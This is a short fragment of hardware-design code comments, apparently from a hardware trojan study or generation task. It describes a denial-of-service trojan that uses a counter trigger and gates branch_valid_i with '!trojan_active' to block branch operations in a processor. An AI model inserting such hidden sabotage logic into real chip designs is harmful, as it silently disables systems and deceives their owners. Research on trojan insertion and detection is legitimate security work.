 ...
 * 
 * Description:
 *   Disables operations by blocking branch_valid_i control signal
 *   
 * Trigger: Counter on branch_valid_i
 * Payload: Block branch_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block branch_valid_i when trojan is active
//
// IMPORTANT: branch_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (branch_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: branch_valid_i && 0 = 0 (always false)
//   All operations controlled by branch_valid_i are blocked
